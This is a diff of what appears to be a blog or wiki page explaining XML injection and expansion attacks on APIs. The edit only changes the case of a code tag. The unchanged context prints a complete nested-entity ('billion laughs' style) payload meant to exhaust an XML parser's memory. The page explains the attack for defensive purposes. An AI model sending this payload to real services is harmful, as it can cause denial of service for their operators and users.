@@ -14,13 +14,13 @@ XML Injection attacks can be made using external url or schema file references i
 
 XML Expansion attacks, are made by using doctype references in the xml payload, which are recursive or just huge. LOL attack is a famous example of the same. 
 An example payload can be seen as below,
-<pre><CODE>
+<pre><code>
 &lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
 &lt;!DOCTYPE foo [ &lt;!ENTITY a "1234567890" &gt; &lt;!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" &gt; &lt;!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" &gt; &lt;!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;" &gt; &lt;!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;" &gt; &lt;!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;" &gt; &lt;!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;" &gt; &lt;!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;" &gt; &lt;!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;" &gt; &lt;!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;" &gt; ]&gt; 
 &lt;sometag xmlns="somensreference"&gt;
 &lt;data&gt;&j;&lt;/data&gt;
 &lt;/sometag&gt;
-</CODE></pre>
+</code></pre>
 
 I found it quite peculiar to ensure that APIs are secure from these attacks. 
 
